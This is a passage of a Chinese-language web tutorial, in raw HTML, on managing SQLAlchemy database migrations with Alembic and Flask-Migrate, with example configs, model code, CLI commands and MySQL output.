aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更多的配置选项参考官网.</p></blockquote><h4 id="3-修改env-py"><a href="#3-修改env-py" class="headerlink" title="3.修改env.py"></a>3.修改<code>env.py</code></h4><blockquote><p>在<code>alembic</code> 中调用的是<code>sqlalchemy</code>的元类(<code>Base</code>)去操作,这需要手动的去改动<code>env.py</code> 文件.</p><pre class="line-numbers language-python"><code class="language-python">$ vim  alembic<span class="token operator">/</span>env<span class="token punctuation">.</span>py<span class="token comment" spellcheck="true"># 找到target_metadata = None 这行,手动指定 metadata 是在哪个文件中.</span><span class="token comment" spellcheck="true"># 比如这里 metadata 是 Base, Base指定在了sqlalchemy_model.py 这个项目文件中</span><span class="token triple-quoted-string string">"""__file__：当前文档（env.py）os.path.dirname(__file__)：获取当前文档的目录os.path.dirname(os.path.dirname(__file__))：获取当前文档目录的上一级目录sys.path: python寻找导入的包的所有路径sys.path.append(os.path.dirname(os.path.dirname(__file__)))"""</span><span class="token keyword">import</span> os<span class="token punctuation">,</span>syssys<span class="token punctuation">.</span>path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 导入Base</span><span class="token keyword">import</span> sqlalchemy_model<span class="token comment" spellcheck="true"># 指定</span>target_metadata <span class="token operator">=</span> sqlalchemy_model<span class="token punctuation">.</span>Base<span class="token punctuation">.</span>metadata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-创建新的迁移脚本"><a href="#4-创建新的迁移脚本" class="headerlink" title="4.创建新的迁移脚本"></a>4.创建新的迁移脚本</h4><blockquote><p>进行创建第一次的<code>ORM</code>对应</p><pre class="line-numbers language-bash"><code class="language-bash">$ alembic revision --autogenerate -m <span class="token string">'first commit'</span>INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Context impl MySQLImpl.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Will assume non-transactional DDL.INFO  <span class="token punctuation">[</span>alembic.autogenerate.compare<span class="token punctuation">]</span> Detected added table <span class="token string">'user'</span>INFO  <span class="token punctuation">[</span>alembic.autogenerate.compare<span class="token punctuation">]</span> Detected added table <span class="token string">'address'</span>Generating /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic/versions/8eee680c6ffd_first_commit.py <span class="token punctuation">..</span>.  <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:alembic_demo> show tables;                                       +------------------------+| Tables_in_alembic_demo |+------------------------+| alembic_version        |+------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它会生成一张纪律当前版本号 的表</p></blockquote><h4 id="5-运行第一次迁移"><a href="#5-运行第一次迁移" class="headerlink" title="5.运行第一次迁移"></a>5.运行第一次迁移</h4><blockquote><p>创建迁移脚本后,并没有创建<code>SQLAlchemy Model</code> 对应的表结构.这需要执行第一次的迁移</p><pre class="line-numbers language-bash"><code class="language-bash">$ alembic upgrade <span class="token function">head</span>INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Context impl MySQLImpl.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Will assume non-transactional DDL.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Running upgrade  -<span class="token operator">></span> 8eee680c6ffd, first commit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到<code>alembic</code> 指针指向了第一次的版本号.查看<code>mysql</code> 数据库</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:alembic_demo> show tables;                                                        +------------------------+| Tables_in_alembic_demo |+------------------------+| address                || alembic_version        || user                   |+------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在生成了<code>ORM</code>对应的表结构.</p></blockquote><h4 id="6-变更数据库版本"><a href="#6-变更数据库版本" class="headerlink" title="6.变更数据库版本"></a>6.变更数据库版本</h4><blockquote><p>现在在<code>sqlalchemy_model</code> 中添加新的列</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>__tablename__ <span class="token operator">=</span> <span class="token string">'user'</span>id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>age <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">)</span>addresses <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Address'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成新的数据库迁移脚本,并迁移</p><pre class="line-numbers language-bash"><code class="language-bash">$ alembic revision --autogenerate -m <span class="token string">'add User.age'</span>INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Context impl MySQLImpl.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Will assume non-transactional DDL.INFO  <span class="token punctuation">[</span>alembic.autogenerate.compare<span class="token punctuation">]</span> Detected added column <span class="token string">'user.age'</span>Generating /home/kning/My_Note/Python3_learn/Flask/code/alembic_demo/alembic/versions/154a8d766856_add_user_age.py <span class="token punctuation">..</span>.  <span class="token keyword">done</span>$ alembic upgrade <span class="token function">head</span>INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Context impl MySQLImpl.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Will assume non-transactional DDL.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Running upgrade 8eee680c6ffd -<span class="token operator">></span> 154a8d766856, add User.age<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:alembic_demo> desc user;                                                  +-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | <null>  | auto_increment || name  | varchar(25) | NO   |     | <null>  |                || age   | int(11)     | YES  |     | <null>  |                |+-------+-------------+------+-----+---------+----------------+mysql root@192.168.101:alembic_demo> select * from alembic_version;                                                                  +--------------+| version_num  |+--------------+| 154a8d766856 |+--------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到<code>user</code> 表中确实添加了新的列,<code>alembic_version</code> 表中值也指向了最新生成的<code>154a8d766856</code></p><p>可以执行降级,退回到以前的版本</p><pre class="line-numbers language-python"><code class="language-python">$ alembic downgrade <span class="token number">8eee680c6ffd</span> <span class="token comment" spellcheck="true">#&lt;== 版本号码</span>INFO  <span class="token punctuation">[</span>alembic<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>migration<span class="token punctuation">]</span> Context impl MySQLImpl<span class="token punctuation">.</span>INFO  <span class="token punctuation">[</span>alembic<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>migration<span class="token punctuation">]</span> Will assume non<span class="token operator">-</span>transactional DDL<span class="token punctuation">.</span>INFO  <span class="token punctuation">[</span>alembic<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>migration<span class="token punctuation">]</span> Running downgrade <span class="token number">154a8d766856</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">8eee680c6ffd</span><span class="token punctuation">,</span> add User<span class="token punctuation">.</span>age<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:alembic_demo> desc user;                                              +-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | <null>  | auto_increment || name  | varchar(25) | NO   |     | <null>  |                |+-------+-------------+------+-----+---------+----------------+mysql root@192.168.101:alembic_demo> select * from alembic_version;                                                         +--------------+| version_num  |+--------------+| 8eee680c6ffd |+--------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在<code>mysql</code>中表确实回到了以前的状态.<code>upgrade</code>和<code>downgrade</code>都可以指定版本号</p><pre class="line-numbers language-python"><code class="language-python">alembic upgrade <span class="token operator">&lt;</span>version<span class="token operator">></span>alembic downgrade <span class="token operator">&lt;</span>version<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只不过<code>head</code> 参数指向了最新的版本号码,可以使用<code>alembic heads</code> 查看最新的版本号,<code>alembic current</code> 查看当前版本号.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span>$ alembic heads154a8d766856 <span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">(</span>learnpy<span class="token punctuation">)</span> $ alembic currentINFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Context impl MySQLImpl.INFO  <span class="token punctuation">[</span>alembic.runtime.migration<span class="token punctuation">]</span> Will assume non-transactional DDL.8eee680c6ffd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是,即是数据库中表的版本回到了以前的版本号,但是<code>sqlalchemy_model</code> 中的代码并没有改变.需要手动去修改.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>__tablename__ <span class="token operator">=</span> <span class="token string">'user'</span>id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>age <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">)</span>addresses <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Address'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-alembic-常用参数"><a href="#4-alembic-常用参数" class="headerlink" title="4.alembic 常用参数"></a>4.<code>alembic</code> 常用参数</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ alembic -hpositional arguments:<span class="token punctuation">{</span>branches,current,downgrade,edit,heads,history,init,list_templates,merge,revision,show,stamp,upgrade<span class="token punctuation">}</span> branches            Show current branch points. current             Display the current revision <span class="token keyword">for</span> a database. downgrade           Revert to a previous version. edit                Edit revision script<span class="token punctuation">(</span>s<span class="token punctuation">)</span> using <span class="token variable">$EDITOR</span><span class="token keyword">.</span> heads               Show current available heads <span class="token keyword">in</span> the script directory. <span class="token function">history</span>             List changeset scripts <span class="token keyword">in</span> chronological order. init                Initialize a new scripts directory.  创建一个新的alembic 仓库 list_templates      List available templates. merge               Merge two revisions together. Creates a new migration                     file. revision            Create a new revision file. show                Show the revision<span class="token punctuation">(</span>s<span class="token punctuation">)</span> denoted by the given symbol. stamp               <span class="token string">'stamp'</span> the revision table with the given revision<span class="token punctuation">;</span>                     don't run any migrations. upgrade             Upgrade to a later version.init:创建一个alembic仓库revision:创建一个新的版本文件--autogenerate:自动将当前模型的修改，生成迁移脚本-m:本次迁移做了哪些修改，用户可以指定这个参数，方便回顾upgrade:将指定版本的迁移文档映射到数据库中，会执行版本文档中的upgrade函数head:代表当前的迁移脚本的版本号downgrade:会执行指定版本的迁移文档中的downgrade函数heads:展示当前可用的heads脚本文档history:列出所有的迁移版本及其信息current:展示当前数据库中的版本号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-alembic在Flask中的应用"><a href="#5-alembic在Flask中的应用" class="headerlink" title="5.alembic在Flask中的应用"></a>5.<code>alembic</code>在<code>Flask</code>中的应用</h3><blockquote><p>如果在<code>flask</code> 中使用的是<code>sqlalchemy-flask</code> ,而不是<code>sqlalchemy</code> 的话,<code>alembic</code> 中的元类也会有不同的映射.</p><p>比如,新建一个<code>flask</code> 项目,项目目录如下:</p><pre class="line-numbers language-bash"><code class="language-bash">─ flask_sqlalchemy_alembic├── app.py├── static└── templates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>对这个目录进行<code>alembic</code>数据库版本控制</p></blockquote><h4 id="1-创建flask-配置文件"><a href="#1-创建flask-配置文件" class="headerlink" title="1.创建flask 配置文件"></a>1.创建<code>flask</code> 配置文件</h4><blockquote><p>首先对<code>flask</code> 生成一个配置文件,把默认的配置都放置在配置文件中</p><pre class="line-numbers language-bash">$ vim config.py</code></pre><pre><code class="python"><code class="language-bash">$ vim config.py</code></pre><pre><code class="python">DEBUG = True  # 开启DebugTEMPLATES_AUTO_RELOAD = True # 模板自动加载DB_URI = 'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_alembic_demo' # 确保数据库存在 # 确保数据库存在# 指定数据库连接SQLALCHEMY_DATABASE_URI = DB_URISQLALCHEMY_TRACK_MODIFICATIONS = False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-修改app-py"><a href="#2-修改app-py" class="headerlink" title="2.修改app.py"></a>2.修改<code>app.py</code></h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span><span class="token string">'config'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 指定配置文件</span><span class="token comment" spellcheck="true"># 创建Model</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span> __tablename__ <span class="token operator">=</span> <span class="token string">'user'</span> id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> user <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-初始化alembic"><a href="#3-初始化alembic" class="headerlink" title="3.初始化alembic"></a>3.初始化<code>alembic</code></h4><blockquote><p>进入到根目录初始化<code>alembic</code></p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cd</span> flask_sqlalchemy_alembic$ alembic init alembic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="4-修改init-配置文件"><a href="#4-修改init-配置文件" class="headerlink" title="4.修改init 配置文件"></a>4.修改<code>init</code> 配置文件</h4><blockquote><pre class="line-numbers language-bash">$ vim  ./alembic.ini</code></pre><pre><code class="ini"><code class="language-bash">$ vim  ./alembic.ini</code></pre><pre><code class="ini"># 找到并修改为 和 engine 一样的字段sqlalchemy.url = mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_alembic_demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="5-修改env-py"><a href="#5-修改env-py" class="headerlink" title="5.修改env.py"></a>5.修改<code>env.py</code></h4><blockquote><pre class="line-numbers language-bash">$ vim ./alembic/env.py</code></pre><pre><code class="python"><code class="language-bash">$ vim ./alembic/env.py</code></pre><pre><code class="python"># 加入系统查找路径import os,syssys.path.append(os.path.dirname(os.path.dirname(__file__)))import app# 找到并修改target_metadata = app.db.Model.metadata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="6-创建迁移脚本"><a href="#6-创建迁移脚本" class="headerlink" title="6.创建迁移脚本"></a>6.创建迁移脚本</h4><blockquote><pre class="line-numbers language-bash">$ alembic revision --autogenerate -m &#39;first commit&#39;</code></pre></blockquote><h4 id="7-切换数据库版本"><a href="#7-切换数据库版本" class="headerlink" title="7.切换数据库版本"></a>7.切换数据库版本</h4><blockquote><pre><code class="bash">$ alembic upgrade head</code></pre><p>查看<code>mysql</code>:</p><pre><code class="mysql"><code class="language-bash">$ alembic revision --autogenerate -m &#39;first commit&#39;</code></pre></blockquote><h4 id="7-切换数据库版本"><a href="#7-切换数据库版本" class="headerlink" title="7.切换数据库版本"></a>7.切换数据库版本</h4><blockquote><pre><code class="bash">$ alembic upgrade head</code></pre><p>查看<code>mysql</code>:</p><pre><code class="mysql">mysql root@192.168.101:flask_alembic_demo> show tables;                                            +------------------------------+| Tables_in_flask_alembic_demo |+------------------------------+| alembic_version              || user                         |+------------------------------+mysql root@192.168.101:flask_alembic_demo> desc user;                    +-------+-------------+------+-----+---------+----------------+| Field | Type        | Null | Key | Default | Extra          |+-------+-------------+------+-----+---------+----------------+| id    | int(11)     | NO   | PRI | <null>  | auto_increment || user  | varchar(20) | NO   |     | <null>  |                |+-------+-------------+------+-----+---------+----------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">$ treeflask_sqlalchemy_alembic├── alembic│   ├── env.py│   ├── __pycache__│   │   └── env.cpython-37.pyc│   ├── README│   ├── script.py.mako│   └── versions│       ├── a8a6381cf539_first_commit.py│       └── __pycache__│           └── a8a6381cf539_first_commit.cpython-37.pyc├── alembic.ini├── app.py├── config.py├── static└── templates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><hr><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-10/1599749828166-10291.png" alt="10291"></p><h2 id="Flask-migrate"><a href="#Flask-migrate" class="headerlink" title="Flask-migrate"></a><code>Flask-migrate</code></h2><h3 id="1-什么是Flask-migrate"><a href="#1-什么是Flask-migrate" class="headerlink" title="1.什么是Flask-migrate"></a>1.什么是<code>Flask-migrate</code></h3><blockquote><p><code>Flask-Migrate</code> 是基于<code>Alembic</code> 处理<code>SQLAlchemy</code> 数据库迁移的扩展.</p><p>在使用<code>Alembic</code>时,需要配置<code>ini</code> 配置文件和<code>env.py</code> 文件,在<code>Flask-Migrate</code> 中会自动的配置这些文件.它支持<code>Alembic</code> 的所有命令.可以使用<code>Flask</code> 命令行和<code>Flask-Script</code> 来操作数据库.</p><p><a href="https://flask-migrate.readthedocs.io/en/latest/" target="_blank" rel="noopener">官网</a></p><p>官网有很多的用法,这里只扩展和<code>Flask-Script</code> 一起使用.</p></blockquote><h3 id="2-安装-1"><a href="#2-安装-1" class="headerlink" title="2.安装"></a>2.安装</h3><blockquote><pre class="line-numbers language-shell">$ pip install flask-migrate</code></pre></blockquote><h3 id="3-和flask-script-一起使用"><a href="#3-和flask-script-一起使用" class="headerlink" title="3.和flask-script 一起使用"></a>3.和<code>flask-script</code> 一起使用</h3><blockquote><p>基于<a href="./10038.md">circular_references</a>项目,项目目录为</p><pre><code class="shell"><code class="language-shell">$ pip install flask-migrate</code></pre></blockquote><h3 id="3-和flask-script-一起使用"><a href="#3-和flask-script-一起使用" class="headerlink" title="3.和flask-script 一起使用"></a>3.和<code>flask-script</code> 一起使用</h3><blockquote><p>基于<a href="./10038.md">circular_references</a>项目,项目目录为</p><pre><code class="shell">$ treecircular_references├── app.py                          # 主 app 文件├── config.py                        # Flask 配置文件├── models.py                    # 存放flask-sqlalchemy.Model 类├── ext.py                                # 存放 db ├── static                              #  css,js 文件目录└── templates                     # 模板文件目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改<code>config.py</code> 文件,指定一个新的数据库(如果<code>mysql</code> 中没有,需要新建一个数据库)</p><pre class="line-numbers language-mysql"><code class="language-mysql">create database flask_migrate_demo;use flask_migrate_demo;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python">DEBUG <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment" spellcheck="true"># 开启Debug</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true"># 模板自动加载</span>DB_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_migrate_demo'</span> <span class="token comment" spellcheck="true"># 确保数据库存在</span><span class="token comment" spellcheck="true"># 指定数据库连接</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> DB_URISQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建<code>flask-script</code> 管理文件<code>manager.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token keyword">from</span> flask_migrate <span class="token keyword">import</span> Migrate<span class="token punctuation">,</span>MigrateCommand<span class="token keyword">from</span> ext <span class="token keyword">import</span> db<span class="token comment" spellcheck="true"># 导入migrate=Alembic 操作的Model</span><span class="token keyword">from</span> models <span class="token keyword">import</span> User2<span class="token punctuation">,</span>Address2<span class="token comment" spellcheck="true"># 绑定app</span>manager <span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 导入 flask-migrate</span><span class="token comment" spellcheck="true"># 导入的Migrate类 可以绑定app ,db到 migrate 中</span><span class="token comment" spellcheck="true"># 导入的MigrateCommand 类可以使用 Alembic 中所有的命令</span>Migrate<span class="token punctuation">(</span>app<span class="token punctuation">,</span>db<span class="token punctuation">)</span>manager<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span><span class="token string">'db'</span><span class="token punctuation">,</span> MigrateCommand<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 起一个别名</span><span class="token comment" spellcheck="true"># 需要导入 Alembic 操作的 Model</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行<code>manager.py</code> 之前,先看下<code>mysql</code>数据库中信息.</p><pre class="line-numbers language-mysql"><code class="language-mysql">>  use flask_migrate_demo > show tables;                                            ;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看帮助信息</p><pre class="line-numbers language-shell"><code class="language-shell"># 可以看到命令参数和 Alembic 一样,有的命令还设置了简化$ python manager.py db --helpusage: Perform database migrationsPerform database migrationspositional arguments:{init,revision,migrate,edit,merge,upgrade,downgrade,show,history,heads,branches,current,stamp} init                Creates a new migration repository revision            Create a new revision file. migrate             Alias for 'revision --autogenerate' edit                Edit current revision. merge               Merge two revisions together. Creates a new migration                     file upgrade             Upgrade to a later version downgrade           Revert to a previous version show                Show the revision denoted by the given symbol. history             List changeset scripts in chronological order. heads               Show current available heads in the script directory branches            Show current branch points current             Display the current revision for each database. stamp               'stamp' the revision table with the given revision;                     don't run any migrationsoptional arguments:-?, --help            show this help message and exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>alembic</code> 中基本的数据库版本控制包括</p><ol><li>初始化</li><li>修改<code>init</code>配置文件</li><li>修改<code>env.py</code></li><li>创建新的迁移脚本</li><li>变更数据库版本<ol><li>升级数据库版本</li><li>降级数据库版本</li></ol></li></ol><p>而<code>migrate</code> 设置了简化,只需要</p><ol><li>初始化</li><li>创建新的迁移脚本</li><li>变更数据库版本<ol><li>升级数据库版本</li><li>降级数据库版本</li></ol></li></ol></blockquote><h4 id="1-初始化-1"><a href="#1-初始化-1" class="headerlink" title="1.初始化"></a>1.初始化</h4><blockquote><p><code>alembic</code></p><pre class="line-numbers language-bash">alembic init alembic</code></pre><p><code>migrate</code></p><pre><code class="shell">$ python manager.py db init</code></pre><p>此时查看目录结构</p><pre><code class="shell"><code class="language-bash">alembic init alembic</code></pre><p><code>migrate</code></p><pre><code class="shell">$ python manager.py db init</code></pre><p>此时查看目录结构</p><pre><code class="shell">circular_references├── app.py                          # 主 app 文件├── config.py                        # Flask 配置文件├── manager.py                    # Flask-script 脚本文件├── migrations                    # 自动生成的文件夹名称│   ├── alembic.ini                       # alembic配置文件│   ├── env.py                               # alembic 的使用文件│   ├── README│   ├── script.py.mako│   └── versions                          # 版本目录├── models.py                    # 存放flask-sqlalchemy.Model 类├── ext.py                                # 存放 db ├── static                              #  css,js 文件目录└── templates                     # 模板文件目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-创建新的迁移脚本"><a href="#2-创建新的迁移脚本" class="headerlink" title="2.创建新的迁移脚本"></a>2.创建新的迁移脚本</h4><blockquote><p>查看帮助可以看到</p><pre class="line-numbers language-bash">migrate             Alias for &#39;revision --autogenerate&#39;</code></pre><p><code>migrate</code>参数默认使用了<code>--autogenerate</code> 命令</p><p>可以如下创建迁移脚本</p><pre><code class="shell"><code class="language-bash">migrate             Alias for &#39;revision --autogenerate&#39;</code></pre><p><code>migrate</code>参数默认使用了<code>--autogenerate</code> 命令</p><p>可以如下创建迁移脚本</p><pre><code class="shell">$ python manager.py db migrateINFO  [alembic.runtime.migration] Context impl 